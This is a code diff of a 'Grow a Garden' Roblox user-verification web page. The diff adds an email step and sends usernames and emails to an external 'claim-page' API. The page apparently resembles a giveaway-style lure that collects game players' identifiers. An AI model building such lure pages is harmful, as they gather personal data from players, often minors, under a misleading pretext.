@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Grow a Garden - Username Verification</title>
+  <title>Grow a Garden - User Verification</title>
   <style>
     * {
       margin: 0; padding: 0; box-sizing: border-box;
@@ -20,7 +20,7 @@
       padding: 40px;
       border-radius: 20px;
       box-shadow: 0 20px 40px rgba(0,0,0,0.15);
-      max-width: 450px;
+      max-width: 500px;
       width: 100%;
       text-align: center;
       animation: slideUp 0.6s ease-out;
@@ -73,6 +73,14 @@
       border-color: #4CAF50;
       box-shadow: 0 0 0 3px rgba(76, 175, 80, 0.1);
       background: white;
+    }
+    input.error {
+      border-color: #f44336;
+      background: #fff5f5;
+    }
+    input.valid {
+      border-color: #4CAF50;
+      background: #f0fff4;
     }
     .btn {
       background: linear-gradient(45deg, #4CAF50, #66BB6A);
@@ -148,6 +156,22 @@
       border-left: 4px solid #4caf50;
       text-align: left;
     }
+    .validation-message {
+      font-size: 14px;
+      margin-top: 8px;
+      padding: 8px 12px;
+      border-radius: 6px;
+    }
+    .validation-message.error {
+      background: #ffebee;
+      color: #c62828;
+      border: 1px solid #ffcdd2;
+    }
+    .validation-message.success {
+      background: #e8f5e9;
+      color: #2e7d32;
+      border: 1px solid #c8e6c9;
+    }
     .note {
       background: #fff3cd;
       color: #856404;
@@ -166,13 +190,66 @@
       font-size: 12px;
       text-align: left;
     }
+    .step-indicator {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 30px;
+      gap: 10px;
+    }
+    .step-dot {
+      width: 12px;
+      height: 12px;
+      border-radius: 50%;
+      background: #ddd;
+      transition: background 0.3s ease;
+    }
+    .step-dot.active {
+      background: #4CAF50;
+    }
+    .step-dot.completed {
+      background: #66BB6A;
+    }
+    .summary-card {
+      background: #f8f9fa;
+      padding: 25px;
+      border-radius: 15px;
+      margin: 25px 0;
+      border: 2px solid #e9ecef;
+      text-align: left;
+    }
+    .summary-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 12px 0;
+      border-bottom: 1px solid #e9ecef;
+    }
+    .summary-item:last-child {
+      border-bottom: none;
+    }
+    .summary-label {
+      font-weight: 600;
+      color: #555;
+    }
+    .summary-value {
+      color: #333;
+      font-weight: 500;
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="logo">🌱</div>
     <h1>Grow a Garden</h1>
-    <p class="subtitle">Username Verification</p>
+    <p class="subtitle">User Verification</p>
+
+    <div class="step-indicator">
+      <div class="step-dot active" id="dot1"></div>
+      <div class="step-dot" id="dot2"></div>
+      <div class="step-dot" id="dot3"></div>
+      <div class="step-dot" id="dot4"></div>
+    </div>
 
     <!-- Step 1: Enter Username -->
     <div class="step active" id="step1">
@@ -206,11 +283,58 @@
           alt="Profile Picture"
         />
         <div id="profileName" class="profile-name"></div>
-        <div class="profile-question">Is this you?</div>
+        <div class="profile-question">Is this your Roblox account?</div>
 
         <button class="btn" onclick="confirmProfile()">Yes, that's me!</button>
-        <button class="btn secondary" onclick="goBack()">No, try again</button>
+        <button class="btn secondary" onclick="goBack(1)">No, try again</button>
       </div>
+    </div>
+
+    <!-- Step 3: Enter Email -->
+    <div class="step" id="step3">
+      <div class="form-group">
+        <label for="emailAddress">Enter your Email Address:</label>
+        <input
+          type="email"
+          id="emailAddress"
+          placeholder="your.email@example.com"
+          required
+          autocomplete="email"
+        />
+        <div id="emailValidation" class="validation-message" style="display: none;"></div>
+      </div>
+
+      <button class="btn" onclick="validateEmail()" id="emailBtn">
+        Validate Email
+      </button>
+      <button class="btn secondary" onclick="goBack(2)">Go Back</button>
+
+      <div class="note">
+        We'll verify that this email address is valid and can receive messages
+      </div>
+    </div>
+
+    <!-- Step 4: Final Confirmation -->
+    <div class="step" id="step4">
+      <h2 style="color: #333; margin-bottom: 25px;">Confirm Your Details</h2>
+      
+      <div class="summary-card">
+        <div class="summary-item">
+          <span class="summary-label">Roblox Username:</span>
+          <span class="summary-value" id="summaryUsername"></span>
+        </div>
+        <div class="summary-item">
+          <span class="summary-label">Email Address:</span>
+          <span class="summary-value" id="summaryEmail"></span>
+        </div>
+      </div>
+
+      <div class="profile-card" style="margin-top: 20px;">
+        <img id="summaryAvatar" class="profile-avatar" src="" alt="Profile Picture" />
+      </div>
+
+      <button class="btn" onclick="finalSubmit()">Complete Registration</button>
+      <button class="btn secondary" onclick="goBack(3)">Edit Email</button>
     </div>
 
     <!-- Error/Success Messages -->
@@ -221,21 +345,48 @@
 
   <script>
     let currentUserData = null;
+    let currentEmailData = null;
+    let currentStep = 1;
     const userCache = {}; // Cache verified users to avoid repeat API calls
+
+    function updateStepIndicator(step) {
+      for (let i = 1; i <= 4; i++) {
+        const dot = document.getElementById(`dot${i}`);
+        dot.classList.remove('active', 'completed');
+        
+        if (i < step) {
+          dot.classList.add('completed');
+        } else if (i === step) {
+          dot.classList.add('active');
+        }
+      }
+    }
+
+    function showStep(stepNumber) {
+      currentStep = stepNumber;
+      document.querySelectorAll('.step').forEach((step) =>
+        step.classList.remove('active')
+      );
+      document.getElementById('step' + stepNumber).classList.add('active');
+      updateStepIndicator(stepNumber);
+      
+      // Clear messages when changing steps
+      document.getElementById('errorMessage').style.display = 'none';
+      document.getElementById('successMessage').style.display = 'none';
+      document.getElementById('debugInfo').style.display = 'none';
+    }
 
     function displayUserProfile(userData) {
       const avatarImg = document.getElementById('profileAvatar');
       const profileName = document.getElementById('profileName');
       
-      // Set up avatar with fallback handling and rate limit detection
+      // Set up avatar with fallback handling
       avatarImg.onerror = function() {
         console.log('Avatar failed to load, trying fallback...');
         
         const fallbackUrls = [
           `https://www.roblox.com/bust-thumbnail/image?userId=${userData.userId}&width=150&height=150&format=png`,
-          // Add timestamp to bypass cache/rate limits
           `https://www.roblox.com/headshot-thumbnail/image?userId=${userData.userId}&width=150&height=150&format=png&t=${Date.now()}`,
-          // Different size to try different endpoint
           `https://www.roblox.com/headshot-thumbnail/image?userId=${userData.userId}&width=100&height=100&format=png`,
         ];
         
@@ -243,11 +394,9 @@
         const nextIndex = fallbackUrls.findIndex(url => url.split('&t=')[0] === currentSrc.split('&t=')[0]) + 1;
         
         if (nextIndex < fallbackUrls.length) {
-          console.log('Trying fallback URL:', fallbackUrls[nextIndex]);
           this.src = fallbackUrls[nextIndex];
         } else {
           // Create placeholder avatar
-          console.log('All avatar URLs failed, creating placeholder');
           this.src = 'data:image/svg+xml,' + encodeURIComponent(`
             <svg xmlns="http://www.w3.org/2000/svg" width="150" height="150" viewBox="0 0 150 150">
               <rect width="150" height="150" fill="#4CAF50"/>
@@ -259,7 +408,6 @@
         }
       };
       
-      // Add random parameter to try to bypass rate limiting
       const avatarUrl = userData.avatar.includes('?') 
         ? `${userData.avatar}&t=${Date.now()}`
         : `${userData.avatar}?t=${Date.now()}`;
@@ -267,13 +415,6 @@
       avatarImg.src = avatarUrl;
       avatarImg.alt = `${userData.username}'s Avatar`;
       profileName.textContent = userData.username;
-    }
-
-    function showStep(stepNumber) {
-      document.querySelectorAll('.step').forEach((step) =>
-        step.classList.remove('active')
-      );
-      document.getElementById('step' + stepNumber).classList.add('active');
     }
 
     function showError(message) {
@@ -297,6 +438,22 @@
       debugEl.style.display = 'block';
     }
 
+    function showEmailValidation(message, isValid) {
+      const validationEl = document.getElementById('emailValidation');
+      const emailInput = document.getElementById('emailAddress');
+      
+      validationEl.textContent = message;
+      validationEl.className = `validation-message ${isValid ? 'success' : 'error'}`;
+      validationEl.style.display = 'block';
+      
+      emailInput.className = isValid ? 'valid' : 'error';
+    }
+
+    function validateEmailFormat(email) {
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return emailRegex.test(email);
+    }
+
     async function verifyUsername() {
       const username = document.getElementById('robloxUsername').value.trim();
       const verifyBtn = document.getElementById('verifyBtn');
@@ -306,7 +463,6 @@
         return;
       }
 
-      // Basic username validation
       if (username.length < 3 || username.length > 20) {
         showError('Username must be between 3-20 characters');
         return;
@@ -317,18 +473,10 @@
         return;
       }
 
-      // Show loading state
       verifyBtn.innerHTML = '<span class="loading"></span>Verifying...';
       verifyBtn.disabled = true;
 
-      // Clear previous messages
-      document.getElementById('errorMessage').style.display = 'none';
-      document.getElementById('successMessage').style.display = 'none';
-      document.getElementById('debugInfo').style.display = 'none';
-
-      // Check cache first
       if (userCache[username.toLowerCase()]) {
-        console.log('Using cached user data');
         currentUserData = userCache[username.toLowerCase()];
         displayUserProfile(currentUserData);
         showStep(2);
@@ -338,9 +486,7 @@
       }
 
       try {
-        console.log('Sending request to API...');
-        
-        const response = await fetch('https://claim-page-one.vercel.app/api/verify', {
+        const response = await fetch('https://claim-page-one.vercel.app/api/verify-user', {
           method: 'POST',
           headers: { 
             'Content-Type': 'application/json',
@@ -349,14 +495,8 @@
           body: JSON.stringify({ username }),
         });
 
-        console.log('Response status:', response.status);
-        console.log('Response headers:', response.headers);
-
-        // Get the raw response text first
         const responseText = await response.text();
-        console.log('Raw response:', responseText);
         
-        // Show debug info
         showDebug({
           status: response.status,
           statusText: response.statusText,
@@ -368,7 +508,7 @@
         try {
           userData = JSON.parse(responseText);
         } catch (parseError) {
-          throw new Error(`Invalid JSON response: ${parseError.message}. Response was: ${responseText.substring(0, 200)}`);
+          throw new Error(`Invalid JSON response: ${parseError.message}`);
         }
 
         if (!response.ok) {
@@ -376,16 +516,13 @@
           return;
         }
 
-        // Success: show profile confirmation
         currentUserData = {
           username: userData.username,
           avatar: userData.avatarUrl,
           userId: userData.userId,
         };
 
-        // Cache the user data
         userCache[username.toLowerCase()] = currentUserData;
-
         displayUserProfile(currentUserData);
         showStep(2);
       } catch (error) {
@@ -399,31 +536,154 @@
 
     function confirmProfile() {
       if (!currentUserData) return;
+      showStep(3);
+    }
 
-      showSuccess(`✅ Username verified: ${currentUserData.username}`);
+    async function validateEmail() {
+      const email = document.getElementById('emailAddress').value.trim();
+      const emailBtn = document.getElementById('emailBtn');
 
-      console.log('Verified user data:', currentUserData);
+      if (!email) {
+        showEmailValidation('Please enter an email address', false);
+        return;
+      }
+
+      if (!validateEmailFormat(email)) {
+        showEmailValidation('Please enter a valid email address format', false);
+        return;
+      }
+
+      emailBtn.innerHTML = '<span class="loading"></span>Validating...';
+      emailBtn.disabled = true;
+
+      try {
+        const response = await fetch('https://claim-page-one.vercel.app/api/verify-user', {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify({ 
+            username: currentUserData.username,
+            email: email 
+          }),
+        });
+
+        const responseText = await response.text();
+        let result;
+        
+        try {
+          result = JSON.parse(responseText);
+        } catch (parseError) {
+          throw new Error(`Invalid JSON response: ${parseError.message}`);
+        }
+
+        if (!response.ok) {
+          showEmailValidation(result.error || 'Email validation failed', false);
+          return;
+        }
+
+        if (result.emailValid) {
+          currentEmailData = {
+            email: email,
+            isValid: true,
+            provider: result.emailProvider || 'unknown'
+          };
+          
+          showEmailValidation('✅ Email address is valid!', true);
+          
+          // Update summary
+          document.getElementById('summaryUsername').textContent = currentUserData.username;
+          document.getElementById('summaryEmail').textContent = email;
+          document.getElementById('summaryAvatar').src = currentUserData.avatar;
+          
+          setTimeout(() => {
+            showStep(4);
+          }, 1500);
+        } else {
+          showEmailValidation(result.reason || 'Email address appears to be invalid', false);
+        }
+      } catch (error) {
+        console.error('Email validation error:', error);
+        showEmailValidation(`Error validating email: ${error.message}`, false);
+      } finally {
+        emailBtn.innerHTML = 'Validate Email';
+        emailBtn.disabled = false;
+      }
+    }
+
+    function finalSubmit() {
+      if (!currentUserData || !currentEmailData) {
+        showError('Missing required information');
+        return;
+      }
+
+      showSuccess(`✅ Registration complete! Welcome ${currentUserData.username}!`);
+      
+      const finalData = {
+        roblox: currentUserData,
+        email: currentEmailData,
+        timestamp: new Date().toISOString()
+      };
+      
+      console.log('Final registration data:', finalData);
 
       setTimeout(() => {
         alert(`Welcome ${currentUserData.username}! Redirecting to server...`);
-        // window.location.href = '/join-server?user=' + currentUserData.userId;
+        // window.location.href = '/join-server?' + new URLSearchParams({
+        //   userId: currentUserData.userId,
+        //   username: currentUserData.username,
+        //   email: currentEmailData.email
+        // });
       }, 2000);
     }
 
-    function goBack() {
-      currentUserData = null;
-      document.getElementById('robloxUsername').value = '';
-      showStep(1);
-
-      document.getElementById('errorMessage').style.display = 'none';
-      document.getElementById('successMessage').style.display = 'none';
-      document.getElementById('debugInfo').style.display = 'none';
+    function goBack(toStep) {
+      if (toStep === 1) {
+        currentUserData = null;
+        document.getElementById('robloxUsername').value = '';
+      } else if (toStep === 2) {
+        currentEmailData = null;
+        document.getElementById('emailAddress').value = '';
+        document.getElementById('emailValidation').style.display = 'none';
+        document.getElementById('emailAddress').className = '';
+      } else if (toStep === 3) {
+        // Just go back to email step, keep data
+      }
+      
+      showStep(toStep);
     }
 
-    // Allow Enter key to submit
+    // Event listeners
     document.getElementById('robloxUsername').addEventListener('keypress', function (e) {
       if (e.key === 'Enter') {
         verifyUsername();
+      }
+    });
+
+    document.getElementById('emailAddress').addEventListener('keypress', function (e) {
+      if (e.key === 'Enter') {
+        validateEmail();
+      }
+    });
+
+    // Real-time email format validation
+    document.getElementById('emailAddress').addEventListener('input', function(e) {
+      const email = e.target.value.trim();
+      const validationEl = document.getElementById('emailValidation');
+      
+      if (email.length === 0) {
+        validationEl.style.display = 'none';
+        e.target.className = '';
+        return;
+      }
+      
+      if (validateEmailFormat(email)) {
+        e.target.className = 'valid';
+        validationEl.style.display = 'none';
+      } else {
+        e.target.className = 'error';
+        showEmailValidation('Please enter a valid email format', false);
       }
     });
   </script>
